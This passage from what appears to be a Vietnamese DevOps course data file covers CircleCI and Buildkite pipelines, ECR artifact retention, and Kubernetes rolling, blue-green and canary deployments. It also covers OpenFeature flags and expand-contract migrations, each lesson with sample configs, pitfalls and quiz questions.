          "TeamCity (JetBrains): máy chủ CI thường tự host, mạnh với dự án Java/.NET; cấu hình bằng giao diện hoặc Kotlin DSL; khái niệm build configuration, build chain, snapshot dependency."
        ]
      },
      {
        h: "Ví dụ CircleCI",
        p: [
          "Workflow dưới đây chạy test, dừng ở bước `hold` chờ duyệt, rồi deploy, chỉ trên nhánh main."
        ],
        code: {
          lang: "yaml",
          file: ".circleci/config.yml",
          src: `version: 2.1

jobs:
  test:
    docker:
      - image: cimg/node:lts
    steps:
      - checkout
      - restore_cache:
          keys:
            - npm-v1-{{ checksum "package-lock.json" }}
      - run: npm ci
      - save_cache:
          key: npm-v1-{{ checksum "package-lock.json" }}
          paths:
            - ~/.npm
      - run: npm test
  deploy:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      - run: ./scripts/deploy.sh production

workflows:
  ci:
    jobs:
      - test
      - hold:
          type: approval
          requires: [test]
          filters:
            branches:
              only: main
      - deploy:
          requires: [hold]`
        }
      },
      {
        h: "Ví dụ Buildkite",
        p: [
          "Buildkite tách phần điều phối (SaaS) và phần chạy (agent của bạn). Điểm này hấp dẫn với đội cần build trong mạng nội bộ mà không muốn tự vận hành máy chủ CI."
        ],
        code: {
          lang: "yaml",
          file: ".buildkite/pipeline.yml",
          src: `steps:
  - label: "Test"
    command: "npm ci && npm test"
    agents:
      queue: default

  - wait

  - block: "Deploy production?"
    branches: main

  - label: "Deploy"
    command: "./scripts/deploy.sh production"
    branches: main
    concurrency: 1
    concurrency_group: deploy-production`
        }
      },
      {
        h: "Chọn công cụ theo tiêu chí gì",
        p: [
          "Code nằm trên GitHub thì GitHub Actions thường là lựa chọn ít ma sát nhất; nằm trên GitLab thì dùng GitLab CI. Khi đánh giá công cụ khác, hãy xem: nơi chạy build (SaaS hay hạ tầng riêng), chi phí theo phút hay theo agent, khả năng tái sử dụng cấu hình, hỗ trợ OIDC tới cloud, và đội có sẵn kinh nghiệm không. Đổi công cụ CI tốn công hơn bạn nghĩ; hãy giữ logic trong script (`./scripts/deploy.sh`) để phần YAML mỏng và dễ chuyển."
        ]
      },
      {
        h: "Bảng tương đương khái niệm",
        p: [
          "Khi đọc một pipeline lạ, hãy tìm những khái niệm tương đương dưới đây. Tên khác nhau nhưng vai trò giống nhau."
        ],
        list: [
          "Đơn vị công việc: job (GitHub, GitLab, CircleCI), stage (Jenkins), step (Buildkite).",
          "Nơi chạy: runner (GitHub, GitLab), agent (Jenkins, Buildkite, TeamCity), executor (CircleCI).",
          "Cổng duyệt: environment reviewers (GitHub), `when: manual` (GitLab), `input` (Jenkins), `type: approval` (CircleCI), `block` (Buildkite).",
          "Tái sử dụng: reusable workflow (GitHub), `include` (GitLab), shared library (Jenkins), orb (CircleCI), plugin (Buildkite)."
        ]
      }
    ],
    summary: [
      "Khái niệm CI giống nhau giữa các công cụ: job, agent, cache, artifact, secret, cổng duyệt.",
      "CircleCI: executor, workflows, orbs, job approval.",
      "Buildkite: điều phối SaaS, agent tự host, `wait` và `block`.",
      "Giữ logic trong script để dễ chuyển đổi công cụ."
    ],
    pitfalls: [
      "Nhồi toàn bộ logic vào YAML của một công cụ, đến lúc chuyển công cụ phải viết lại hết.",
      "Chọn công cụ vì trào lưu mà không tính tới nơi chạy build và yêu cầu mạng nội bộ.",
      "Dùng orb hoặc plugin bên thứ ba không pin phiên bản."
    ],
    quiz: [
      {
        q: "Trong CircleCI, cổng duyệt tay được tạo bằng gì?",
        options: ["Job có `type: approval` trong workflow", "`wait`", "`when: manual`", "`input`"],
        answer: 0,
        explain: "CircleCI dùng job `type: approval`. `wait` là của Buildkite, `when: manual` của GitLab, `input` của Jenkins."
      },
      {
        q: "Đặc điểm kiến trúc nổi bật của Buildkite là gì?",
        options: ["Chỉ chạy trên Windows", "Điều phối SaaS, agent chạy trên hạ tầng của bạn", "Không hỗ trợ YAML", "Chỉ dùng cho mobile"],
        answer: 1,
        explain: "Buildkite tách control plane SaaS khỏi agent do bạn vận hành. Nó dùng YAML và chạy trên nhiều hệ điều hành."
      },
      {
        q: "Cách nào giúp pipeline dễ chuyển giữa các công cụ CI?",
        options: ["Viết mọi thứ trong YAML", "Đặt logic vào script trong repo, YAML chỉ gọi script", "Dùng nhiều plugin", "Không viết test"],
        answer: 1,
        explain: "Script chạy được ở mọi công cụ, YAML chỉ là lớp mỏng điều phối. Nhiều plugin làm việc chuyển đổi khó hơn."
      }
    ]
  },
  "p08.m2.t3": {
    sections: [
      {
        h: "Artifact repository là gì",
        p: [
          "Artifact repository là nơi lưu kết quả build có phiên bản: Docker image, package npm, file JAR, Helm chart. Nó là cầu nối giữa CI (tạo artifact) và CD (lấy artifact để deploy). Nhờ nó, nguyên tắc build once, deploy many trở nên khả thi."
        ],
        list: [
          "Registry container: GHCR (GitHub), ECR (AWS), Artifact Registry (Google Cloud), Docker Hub, GitLab Container Registry.",
          "Kho đa định dạng: Sonatype Nexus, JFrog Artifactory, lưu npm, Maven, PyPI, Docker, Helm trong một chỗ.",
          "Proxy/cache: Nexus và Artifactory có thể làm proxy cho npmjs, Maven Central, giúp build nhanh hơn, không phụ thuộc internet và kiểm soát package được phép dùng."
        ]
      },
      {
        h: "Tag bất biến và quét khi push",
        p: [
          "Với ECR, bạn nên bật tag immutable để không ai ghi đè được một tag đã có, và bật quét lỗ hổng khi push. Tag theo SHA kết hợp tag immutable đảm bảo image `task-api:a1b2c3d` luôn là đúng một nội dung."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `aws ecr create-repository \\
  --repository-name task-api \\
  --image-tag-mutability IMMUTABLE \\
  --image-scanning-configuration scanOnPush=true

aws ecr put-lifecycle-policy \\
  --repository-name task-api \\
  --lifecycle-policy-text file://ecr-lifecycle.json`
        }
      },
      {
        h: "Chính sách giữ lại (retention)",
        p: [
          "Mỗi commit tạo một image, sau vài tháng registry có hàng nghìn image và hóa đơn lưu trữ tăng. Lifecycle policy tự xoá image cũ. Hãy giữ đủ để rollback: ví dụ xoá image không tag sau 14 ngày và chỉ giữ 50 image gần nhất. Image đang chạy trên production tuyệt đối không được bị xoá, nên số lượng giữ lại phải lớn hơn khoảng rollback bạn cần."
        ],
        code: {
          lang: "json",
          file: "ecr-lifecycle.json",
          src: `{
  "rules": [
    {
      "rulePriority": 1,
      "description": "Xoá image không tag sau 14 ngày",
      "selection": {
        "tagStatus": "untagged",
        "countType": "sinceImagePushed",
        "countUnit": "days",
        "countNumber": 14
      },
      "action": { "type": "expire" }
    },
    {
      "rulePriority": 2,
      "description": "Chỉ giữ 50 image gần nhất",
      "selection": {
        "tagStatus": "any",
        "countType": "imageCountMoreThan",
        "countNumber": 50
      },
      "action": { "type": "expire" }
    }
  ]
}`
        }
      },
      {
        h: "Chọn loại nào",
        p: [
          "Nếu chỉ cần Docker image và đang dùng một cloud, registry của cloud đó (ECR, Artifact Registry) là đơn giản nhất và tích hợp IAM sẵn. GHCR hợp với dự án trên GitHub, đăng nhập bằng `GITHUB_TOKEN`. Doanh nghiệp có nhiều loại package, cần chạy trong mạng nội bộ hoặc cần kiểm soát nguồn package từ internet thường chọn Nexus hoặc Artifactory. Dù chọn gì, quyền push chỉ cấp cho CI, còn người và cluster chỉ có quyền pull."
        ]
      },
      {
        h: "Package nội bộ",
        p: [
          "Ngoài image, công ty thường có thư viện dùng chung như SDK nội bộ hay cấu hình ESLint. Publish chúng lên GitHub Packages, Nexus hoặc Artifactory với scope riêng như `@my-org`, rồi cấu hình `.npmrc` để scope đó trỏ tới registry nội bộ còn các package khác vẫn lấy từ npmjs. Token đọc từ biến môi trường, không commit vào file."
        ],
        code: {
          lang: "ini",
          file: ".npmrc",
          src: `@my-org:registry=https://npm.pkg.github.com
//npm.pkg.github.com/:_authToken=\${NPM_TOKEN}`
        }
      }
    ],
    summary: [
      "Artifact repository lưu image và package có phiên bản, nối CI với CD.",
      "Bật tag immutable và quét lỗ hổng khi push.",
      "Lifecycle policy xoá image cũ nhưng phải giữ đủ cho rollback.",
      "Chỉ CI có quyền push; người và cluster chỉ pull."
    ],
    pitfalls: [
      "Lifecycle policy quá gắt xoá mất image đang chạy hoặc image cần để rollback.",
      "Để tag mutable, ai đó push đè `v1.2.0` và production chạy nội dung khác mà không ai biết.",
      "Cho developer quyền push trực tiếp lên registry production, bỏ qua pipeline."
    ],
    quiz: [
      {
        q: "Tính năng nào của ECR ngăn ghi đè một tag đã tồn tại?",
        options: ["scanOnPush", "Image tag mutability IMMUTABLE", "Lifecycle policy", "Replication"],
        answer: 1,
        explain: "IMMUTABLE khiến push trùng tag bị từ chối. scanOnPush quét lỗ hổng, lifecycle xoá image cũ, replication sao chép sang region khác."
      },
      {
        q: "Khi thiết kế lifecycle policy, ràng buộc quan trọng nhất là gì?",
        options: ["Xoá càng nhiều càng tốt", "Giữ đủ image để rollback và không xoá image đang chạy", "Chỉ giữ image mới nhất", "Không bao giờ xoá"],
        answer: 1,
        explain: "Mục tiêu là tiết kiệm mà vẫn rollback được. Chỉ giữ image mới nhất làm mất khả năng rollback; không xoá thì chi phí tăng mãi."
      },
      {
        q: "Lợi ích của Nexus/Artifactory khi làm proxy cho npmjs?",
        options: ["Tự viết code", "Cache package, build nhanh hơn và kiểm soát nguồn package", "Thay thế Git", "Tăng số CPU của runner"],
        answer: 1,
        explain: "Proxy lưu bản sao package, giảm phụ thuộc internet và cho phép chặn package không được phép. Nó không thay Git hay tăng tài nguyên runner."
      }
    ]
  },
  "p08.m3.t0": {
    sections: [
      {
        h: "Recreate: tắt hết rồi bật lại",
        p: [
          "Recreate là chiến lược đơn giản nhất: dừng toàn bộ phiên bản cũ, sau đó khởi động phiên bản mới. Ưu điểm là không bao giờ có hai phiên bản chạy cùng lúc, nên không phải lo tương thích giữa bản cũ và bản mới. Nhược điểm là có downtime trong khoảng thời gian bản mới khởi động.",
          "Recreate hợp với môi trường dev, job xử lý nền không phục vụ người dùng trực tiếp, hoặc ứng dụng không thể chạy hai phiên bản song song (ví dụ giữ khoá độc quyền trên một tài nguyên)."
        ]
      },
      {
        h: "Rolling update: thay dần từng phần",
        p: [
          "Rolling update thay các instance cũ bằng instance mới theo từng đợt. Đây là mặc định của Kubernetes Deployment và ECS service. Hai tham số điều khiển tốc độ: `maxSurge` là số pod được tạo vượt số replica mong muốn, `maxUnavailable` là số pod được phép không sẵn sàng trong lúc cập nhật.",
          "Điều kiện sống còn là readiness probe. Kubernetes chỉ chuyển traffic tới pod mới và tiếp tục thay pod cũ khi pod mới báo sẵn sàng. Không có readiness probe, pod được coi là sẵn sàng ngay khi container khởi động, trong khi ứng dụng có thể còn đang kết nối database, và người dùng nhận lỗi 502."
        ],
        code: {
          lang: "yaml",
          file: "k8s/deployment.yaml",
          src: `apiVersion: apps/v1
kind: Deployment
metadata:
  name: task-api
spec:
  replicas: 4
  minReadySeconds: 10          # pod phải sẵn sàng ổn định 10s mới tính là available
  progressDeadlineSeconds: 300 # quá 5 phút không tiến triển thì báo thất bại
  strategy:
    type: RollingUpdate        # hoặc Recreate
    rollingUpdate:
      maxSurge: 1              # tối đa 5 pod trong lúc cập nhật
      maxUnavailable: 0        # luôn giữ đủ 4 pod phục vụ
  selector:
    matchLabels: { app: task-api }
  template:
    metadata:
      labels: { app: task-api }
    spec:
      terminationGracePeriodSeconds: 30
      containers:
        - name: api
          image: ghcr.io/my-org/task-api:a1b2c3d
          ports: [{ containerPort: 3000 }]
          readinessProbe:
            httpGet: { path: /health/ready, port: 3000 }
            periodSeconds: 5
            failureThreshold: 3
          livenessProbe:
            httpGet: { path: /health/live, port: 3000 }
            periodSeconds: 10`
        }
      },
      {
        h: "Đánh đổi và chi tiết hay bị bỏ qua",
        p: [
          "`maxUnavailable: 0` với `maxSurge: 1` an toàn nhất nhưng chậm và cần dư tài nguyên cho một pod. `maxUnavailable: 25%` nhanh hơn nhưng giảm năng lực phục vụ trong lúc cập nhật. Trong khi rolling, bản cũ và bản mới cùng phục vụ, nên API và schema database phải tương thích với cả hai.",
          "Pod cũ bị dừng cũng cần được xử lý khéo: ứng dụng phải bắt tín hiệu SIGTERM, ngừng nhận request mới, hoàn thành request đang xử lý rồi mới thoát (graceful shutdown). Sau khi `kubectl apply`, pipeline nên chạy `kubectl rollout status deployment/task-api --timeout=5m` để chờ và biết deploy có thành công hay không."
        ]
      }
    ],
    summary: [
      "Recreate: đơn giản, không chạy hai phiên bản cùng lúc, nhưng có downtime.",
      "Rolling update: thay dần, điều khiển bằng `maxSurge` và `maxUnavailable`.",
      "Readiness probe là bắt buộc để rolling update không gây lỗi.",
      "Trong rolling, bản cũ và mới cùng chạy nên phải tương thích với nhau."
    ],
    pitfalls: [
      "Không có readiness probe, traffic tới pod chưa sẵn sàng gây lỗi 502 trong mỗi lần deploy.",
      "Readiness probe kiểm tra cả dịch vụ phụ thuộc bên ngoài, một dịch vụ ngoài chậm làm mọi pod bị rút khỏi load balancer.",
      "Ứng dụng không xử lý SIGTERM, request đang chạy bị cắt ngang khi pod cũ bị dừng."
    ],
    quiz: [
      {
        q: "Deployment có `replicas: 4`, `maxSurge: 1`, `maxUnavailable: 0`. Trong lúc cập nhật tối đa có bao nhiêu pod?",
        options: ["3", "4", "5", "8"],
        answer: 2,
        explain: "maxSurge 1 cho phép vượt 1 pod so với 4, tức tối đa 5. maxUnavailable 0 đảm bảo không dưới 4 pod sẵn sàng."
      },
      {
        q: "Vai trò của readiness probe trong rolling update?",
        options: ["Khởi động lại container bị treo", "Chỉ cho traffic vào và tiếp tục cập nhật khi pod mới thực sự sẵn sàng", "Giới hạn CPU", "Tạo log"],
        answer: 1,
        explain: "Readiness quyết định pod có nhận traffic hay không. Khởi động lại container bị treo là việc của liveness probe."
      },
      {
        q: "Khi nào Recreate là lựa chọn hợp lý?",
        options: ["API công khai cần 99,99% uptime", "Ứng dụng không thể chạy hai phiên bản cùng lúc và chấp nhận downtime ngắn", "Luôn luôn", "Khi có nhiều replica"],
        answer: 1,
        explain: "Recreate đổi downtime lấy sự đơn giản và không có hai phiên bản song song. API cần uptime cao nên dùng rolling, blue-green hoặc canary."
      }
    ]
  },
  "p08.m3.t1": {
    sections: [
      {
        h: "Hai môi trường, một công tắc",
        p: [
          "Blue-Green chạy hai môi trường production giống hệt nhau. Blue đang phục vụ người dùng. Bạn deploy phiên bản mới lên Green, kiểm tra kỹ trong khi Green chưa nhận traffic thật, rồi chuyển toàn bộ traffic sang Green trong một thao tác. Nếu có vấn đề, chuyển lại về Blue, gần như tức thì.",
          "Điểm mạnh là rollback cực nhanh và có thể test phiên bản mới trên hạ tầng production thật trước khi mở cho người dùng. Điểm yếu là tốn gấp đôi tài nguyên trong lúc chuyển, và mọi người dùng cùng lúc chuyển sang bản mới nên nếu lỗi thì ảnh hưởng tất cả."
        ]
      },
      {
        h: "Công tắc nằm ở đâu",
        list: [
          "Load balancer: đổi target group của listener (AWS ALB), hoặc đổi upstream trong Nginx rồi reload.",
          "Kubernetes Service: đổi selector từ `version: blue` sang `version: green`.",
          "DNS: đổi bản ghi, nhưng chậm do TTL và cache nên ít dùng cho chuyển nhanh.",
          "Argo Rollouts: chiến lược `blueGreen` tự quản lý service active và preview."
        ],
        p: [
          "Với Argo Rollouts, bạn khai báo service active (nhận traffic thật) và service preview (để test bản mới). Đặt `autoPromotionEnabled: false` để phải promote bằng tay sau khi kiểm tra."
        ],
        code: {
          lang: "yaml",
          file: "k8s/rollout-bluegreen.yaml",
          src: `apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: task-api
spec:
  replicas: 4
  revisionHistoryLimit: 3
  selector:
    matchLabels: { app: task-api }
  template:
    metadata:
      labels: { app: task-api }
    spec:
      containers:
        - name: api
          image: ghcr.io/my-org/task-api:a1b2c3d
          ports: [{ containerPort: 3000 }]
  strategy:
    blueGreen:
      activeService: task-api-active     # traffic người dùng
      previewService: task-api-preview   # test bản mới trước khi chuyển
      autoPromotionEnabled: false
      scaleDownDelaySeconds: 600         # giữ bản cũ 10 phút để rollback nhanh`
        }
      },
      {
        h: "Database là phần khó",
        p: [
          "Hai môi trường ứng dụng thường dùng chung một database. Vì vậy schema phải tương thích với cả Blue và Green: thêm cột mới được, nhưng xoá hay đổi tên cột thì phải đợi khi chắc chắn không còn quay lại Blue. Đây là lý do blue-green đi cùng mô hình migration expand–contract ở bài sau.",
          "Ngoài database còn có session, job trong hàng đợi, kết nối WebSocket đang mở. Sau khi chuyển, bạn nên giữ Blue thêm một thời gian (như `scaleDownDelaySeconds` ở trên) để có thể quay lại, rồi mới thu hồi tài nguyên. Chạy smoke test trên preview trước khi promote là bước không nên bỏ."
        ]
      }
    ],
    summary: [
      "Blue-Green chạy hai môi trường giống nhau, chuyển toàn bộ traffic trong một thao tác.",
      "Rollback nhanh bằng cách chuyển traffic về môi trường cũ.",
      "Tốn tài nguyên gấp đôi trong lúc chuyển; lỗi ảnh hưởng mọi người dùng cùng lúc.",
      "Database dùng chung nên schema phải tương thích với cả hai phiên bản."
    ],
    pitfalls: [
      "Chuyển bằng DNS rồi bất ngờ vì client vẫn gọi môi trường cũ do cache TTL.",
      "Tắt Blue ngay sau khi chuyển, mất khả năng rollback nhanh.",
      "Chạy migration xoá cột trước khi chuyển, Blue lỗi ngay và không còn đường quay lại."
    ],
    quiz: [
      {
        q: "Ưu điểm lớn nhất của Blue-Green là gì?",
        options: ["Tiết kiệm tài nguyên", "Rollback gần như tức thì bằng cách chuyển traffic về môi trường cũ", "Chỉ ảnh hưởng 5% người dùng", "Không cần database"],
        answer: 1,
        explain: "Blue-Green cho phép quay lại ngay. Nó tốn tài nguyên hơn; việc chỉ ảnh hưởng một phần người dùng là đặc điểm của canary."
      },
      {
        q: "Trong Argo Rollouts blueGreen, `previewService` dùng để làm gì?",
        options: ["Nhận traffic người dùng thật", "Cho phép test phiên bản mới trước khi promote", "Lưu log", "Chạy migration"],
        answer: 1,
        explain: "previewService trỏ tới bản mới để test; activeService mới là nơi nhận traffic thật."
      },
      {
        q: "Vì sao schema database là thách thức trong Blue-Green?",
        options: ["Vì mỗi môi trường có database riêng hoàn toàn", "Vì hai phiên bản ứng dụng thường dùng chung database nên schema phải tương thích với cả hai", "Vì database không hỗ trợ Kubernetes", "Vì phải xoá database mỗi lần deploy"],
        answer: 1,
        explain: "Database dùng chung buộc schema tương thích ngược để có thể quay về Blue."
      }
    ]
  },
  "p08.m3.t2": {
    sections: [
      {
        h: "Canary: thử trên một nhóm nhỏ trước",
        p: [
          "Tên gọi đến từ chim hoàng yến được mang xuống mỏ than để cảnh báo khí độc. Canary deployment đưa phiên bản mới cho một phần nhỏ traffic, ví dụ 5%, theo dõi các chỉ số, rồi tăng dần 25%, 50%, 100%. Nếu tỷ lệ lỗi hoặc độ trễ xấu đi, quá trình dừng và traffic quay về bản cũ.",
          "So với Blue-Green, canary giới hạn phạm vi ảnh hưởng: nếu bản mới lỗi, chỉ một phần nhỏ người dùng gặp lỗi trong thời gian ngắn. Đánh đổi là quá trình lâu hơn, cần hệ thống giám sát tốt và cần có đủ traffic để chỉ số có ý nghĩa thống kê."
        ]
      },
      {
        h: "Tự động hoá với Argo Rollouts",
        p: [
          "Argo Rollouts thay Deployment bằng resource Rollout với các bước canary. Bước `analysis` chạy một AnalysisTemplate truy vấn Prometheus. Nếu kết quả không đạt `successCondition` quá `failureLimit` lần, rollout bị abort và tự quay về bản ổn định. Flagger là công cụ tương tự, hay dùng cùng service mesh."
        ],
        code: {
          lang: "yaml",
          file: "k8s/rollout-canary.yaml",
          src: `apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: task-api
spec:
  replicas: 10
  selector:
    matchLabels: { app: task-api }
  template:
    metadata:
      labels: { app: task-api }
    spec:
      containers:
        - name: api
          image: ghcr.io/my-org/task-api:a1b2c3d
  strategy:
    canary:
      steps:
        - setWeight: 5
        - pause: { duration: 5m }
        - analysis:
            templates:
              - templateName: success-rate
            args:
              - name: service-name
                value: task-api
        - setWeight: 25
        - pause: { duration: 10m }
        - setWeight: 50
        - pause: { duration: 10m }
---
apiVersion: argoproj.io/v1alpha1
kind: AnalysisTemplate
metadata:
  name: success-rate
spec:
  args:
    - name: service-name
  metrics:
    - name: success-rate
      interval: 1m
      count: 5
      failureLimit: 1
      successCondition: result[0] >= 0.99
      provider:
        prometheus:
          address: http://prometheus.monitoring.svc:9090
          query: |
            sum(rate(http_requests_total{service="{{args.service-name}}",status!~"5.."}[2m]))
            /
            sum(rate(http_requests_total{service="{{args.service-name}}"}[2m]))`
        }
      },
      {
        h: "Chia traffic chính xác",
        p: [
          "Nếu không cấu hình traffic routing, Argo Rollouts chia traffic xấp xỉ bằng tỷ lệ số pod: 10 replica với weight 5% có thể làm tròn thành 1 pod, tức khoảng 10% traffic. Để chia chính xác theo phần trăm, hãy kết hợp với ingress controller, Gateway API hoặc service mesh qua `trafficRouting`.",
          "Chọn metric đúng quan trọng hơn chọn công cụ. Nên theo dõi tỷ lệ lỗi 5xx, độ trễ p95/p99 và một chỉ số nghiệp vụ như tỷ lệ đặt hàng thành công. So sánh canary với bản ổn định cùng thời điểm tốt hơn so với một ngưỡng cố định, vì traffic thay đổi theo giờ trong ngày."
        ]
      },
      {
        h: "Canary không cần Kubernetes",
        p: [
          "Canary không phải đặc quyền của Kubernetes. Với AWS, Application Load Balancer hỗ trợ weighted target group: chia ví dụ 95% về target group cũ và 5% về target group mới. ECS kết hợp CodeDeploy có sẵn cấu hình kiểu canary như `CodeDeployDefault.ECSCanary10Percent5Minutes`, tự rollback khi CloudWatch alarm kích hoạt.",
          "Với Nginx trên VPS, có thể dùng trọng số `weight` trong upstream. Dù ở nền tảng nào, nguyên tắc vẫn là: phần nhỏ trước, đo, rồi mới mở rộng."
        ]
      }
    ],
    summary: [
      "Canary đưa bản mới cho một phần traffic nhỏ, tăng dần theo từng bước.",
      "Phân tích metric tự động quyết định tiếp tục hay rollback.",
      "Argo Rollouts: Rollout với `steps` và AnalysisTemplate truy vấn Prometheus.",
      "Muốn chia traffic chính xác cần traffic routing qua ingress, Gateway API hoặc mesh."
    ],
    pitfalls: [
      "Canary với rất ít traffic: vài request không đủ để kết luận bản mới tốt hay xấu.",
      "Chỉ theo dõi CPU, bỏ qua tỷ lệ lỗi và chỉ số nghiệp vụ.",
      "Không cấu hình traffic routing rồi ngạc nhiên vì 5% thực tế thành 10% do làm tròn theo pod."
    ],
    quiz: [
      {
        q: "Lợi ích chính của canary so với blue-green?",
        options: ["Rollback nhanh hơn", "Giới hạn phạm vi ảnh hưởng: chỉ một phần nhỏ người dùng gặp bản lỗi", "Không cần giám sát", "Không tốn tài nguyên"],
        answer: 1,
        explain: "Canary giảm số người bị ảnh hưởng. Nó cần giám sát tốt hơn, và blue-green thường rollback nhanh tương đương."
      },
      {
        q: "Trong AnalysisTemplate, điều gì xảy ra khi metric vượt `failureLimit`?",
        options: ["Rollout tiếp tục bước tiếp theo", "Rollout bị abort và traffic quay về bản ổn định", "Prometheus khởi động lại", "Pod bị xoá hết"],
        answer: 1,
        explain: "Phân tích thất bại khiến rollout abort và quay về phiên bản stable."
      },
      {
        q: "Không cấu hình traffic routing, Argo Rollouts chia traffic canary dựa vào gì?",
        options: ["Header HTTP", "Tỷ lệ số pod canary và stable", "Địa chỉ IP người dùng", "Ngẫu nhiên hoàn toàn"],
        answer: 1,
        explain: "Không có traffic router, việc chia dựa trên số pod nên chỉ xấp xỉ. Chia theo header cần traffic routing."
      }
    ]
  },
  "p08.m3.t3": {
    sections: [
      {
        h: "Tách deploy khỏi release",
        p: [
          "Deploy là đưa code lên production. Release là cho người dùng thấy tính năng. Feature flag tách hai việc này ra: code mới được deploy nhưng nằm sau một điều kiện, và bạn bật nó khi muốn, cho ai muốn, không cần deploy lại.",
          "Nhờ vậy, deploy trở thành việc kỹ thuật an toàn có thể làm nhiều lần mỗi ngày, còn release là quyết định sản phẩm: bật cho nhân viên nội bộ, rồi 10% người dùng, rồi theo khu vực. Nếu tính năng có vấn đề, tắt flag nhanh hơn nhiều so với rollback cả deploy."
        ],
        list: [
          "Release flag: ẩn tính năng chưa xong, sống ngắn, xoá sau khi bật 100%.",
          "Experiment flag: A/B test, chia người dùng thành nhóm để so sánh.",
          "Ops flag (kill switch): tắt nhanh một tính năng nặng khi hệ thống quá tải.",
          "Permission flag: bật tính năng cho gói trả phí hoặc khách hàng cụ thể."
        ]
      },
      {
        h: "OpenFeature: API chuẩn, provider tuỳ chọn",
        p: [
          "OpenFeature là chuẩn mở (dự án CNCF) định nghĩa API đánh giá flag, không phụ thuộc nhà cung cấp. Code gọi OpenFeature, còn phía sau là provider: Unleash, LaunchDarkly, flagd, hoặc một provider trong bộ nhớ khi test. Đổi nhà cung cấp chỉ cần đổi provider.",
          "Ví dụ dưới dùng `InMemoryProvider` có sẵn trong SDK server cho Node. `targetingKey` là định danh người dùng, giúp nhà cung cấp chia phần trăm ổn định: cùng một người dùng luôn nhận cùng kết quả."
        ],
        code: {
          lang: "typescript",
          file: "src/flags.ts",
          src: `import { OpenFeature, InMemoryProvider } from '@openfeature/server-sdk';

// Production: thay bằng provider của Unleash, LaunchDarkly, flagd...
await OpenFeature.setProviderAndWait(
  new InMemoryProvider({
    'new-checkout': {
      disabled: false,
      variants: { on: true, off: false },
      defaultVariant: 'off',
    },
  }),
);

const flags = OpenFeature.getClient();

export async function isNewCheckout(userId: string): Promise<boolean> {
  // Giá trị mặc định false được dùng nếu provider lỗi hoặc không tìm thấy flag
  return flags.getBooleanValue('new-checkout', false, { targetingKey: userId });
}`
        }
      },
      {
        h: "Chi phí của feature flag",
        p: [
          "Mỗi flag là một nhánh điều kiện, và n flag tạo ra rất nhiều tổ hợp có thể chạy. Flag không được dọn là nợ kỹ thuật. Hãy đặt chủ sở hữu và ngày hết hạn cho mỗi flag, và tạo việc xoá flag ngay khi tạo nó.",
          "Giá trị mặc định phải là trạng thái an toàn: khi dịch vụ flag không truy cập được, ứng dụng dùng mặc định, thường là tắt tính năng mới. Test cần cover cả hai trạng thái bật và tắt của những flag đang hoạt động. Thay đổi flag trên production cũng là một thay đổi, nên cần có audit log để biết ai bật gì và lúc nào."
        ]
      }
    ],
    summary: [
      "Feature flag tách deploy (kỹ thuật) khỏi release (quyết định sản phẩm).",
      "Các loại: release, experiment, ops kill switch, permission.",
      "OpenFeature là API chuẩn; nhà cung cấp như Unleash, LaunchDarkly là provider.",
      "Mặc định phải an toàn, flag phải có chủ và được dọn khi xong."
    ],
    pitfalls: [
      "Flag tồn tại nhiều năm, không ai dám xoá vì không biết còn dùng không.",
      "Giá trị mặc định là bật, dịch vụ flag sập thì tính năng dở dang lộ ra cho mọi người.",
      "Chia phần trăm không có `targetingKey`, người dùng thấy tính năng lúc có lúc không."
    ],
    quiz: [
      {
        q: "Feature flag giúp tách hai việc nào?",
        options: ["Build và test", "Deploy và release", "Code và review", "Staging và dev"],
        answer: 1,
        explain: "Code được deploy nhưng tính năng chỉ được release khi bật flag."
      },
      {
        q: "Vai trò của OpenFeature là gì?",
        options: ["Một dịch vụ lưu flag trả phí", "API chuẩn mở để đánh giá flag, cho phép đổi nhà cung cấp qua provider", "Một công cụ CI", "Thư viện test"],
        answer: 1,
        explain: "OpenFeature chuẩn hoá API phía ứng dụng; Unleash, LaunchDarkly... là provider phía sau."
      },
      {
        q: "Giá trị mặc định của flag cho tính năng mới nên là gì?",
        options: ["Bật", "Tắt, là trạng thái an toàn khi không đánh giá được flag", "Ngẫu nhiên", "Không cần mặc định"],
        answer: 1,
        explain: "Khi provider lỗi, ứng dụng dùng mặc định; mặc định tắt giữ hành vi cũ đã ổn định."
      }
    ]
  },
  "p08.m3.t4": {
    sections: [
      {
        h: "Migration là bước riêng, chạy trước deploy",
        p: [
          "Migration database không nên chạy lúc ứng dụng khởi động. Khi có 4 replica cùng khởi động, cả 4 cùng cố chạy migration; nếu migration lâu, pod bị liveness probe giết và khởi động lại liên tục. Hãy chạy migration như một job riêng, đúng một lần, trước khi deploy code mới.",
          "Thứ tự chuẩn: migration chạy trước, code mới deploy sau. Vì vậy trong một khoảng thời gian, code cũ đang chạy trên schema mới. Đây là điều kiện then chốt: mọi migration phải tương thích ngược với phiên bản code đang chạy. Nếu không, ngay khi migration xong, bản đang chạy sẽ lỗi."
        ]
      },
      {
        h: "Expand–contract: đổi schema không downtime",
        p: [
          "Muốn đổi tên cột `name` thành `full_name`, bạn không thể làm trong một bước. Hãy chia thành nhiều lần deploy, mỗi lần đều an toàn với cả code cũ và code mới."
        ],
        list: [
          "Expand: thêm cột mới `full_name` cho phép NULL. Code cũ không biết cột này nên không sao.",
          "Deploy code ghi vào cả hai cột, đọc cột mới nếu có, không thì đọc cột cũ.",
          "Backfill: chép dữ liệu cũ sang cột mới theo từng lô nhỏ để tránh khoá bảng lâu.",
          "Deploy code chỉ dùng cột mới.",
          "Contract: khi chắc chắn không còn rollback về bản cũ, xoá cột `name`."
        ],
        code: {
          lang: "sql",
          file: "migrations/2026_09_01_expand_full_name.sql",
          src: `-- Bước expand: an toàn với code cũ
SET lock_timeout = '5s';          -- không chờ khoá quá lâu, lỗi sớm thay vì treo cả bảng
ALTER TABLE users ADD COLUMN full_name text;

-- Index tạo CONCURRENTLY để không chặn ghi (không chạy được trong transaction)
CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_users_full_name ON users (full_name);

-- Bước contract, ở một lần deploy SAU, khi không còn code đọc cột cũ:
-- ALTER TABLE users DROP COLUMN name;`
        }
      },
      {
        h: "Migration trong pipeline",
        p: [
          "Với GitOps và Argo CD, một cách phổ biến là Kubernetes Job gắn hook PreSync: Argo CD chạy job migration trước khi áp dụng Deployment mới; job lỗi thì sync dừng lại và code mới không được deploy. Job dùng chính image của phiên bản sắp deploy để chạy lệnh migration."
        ],
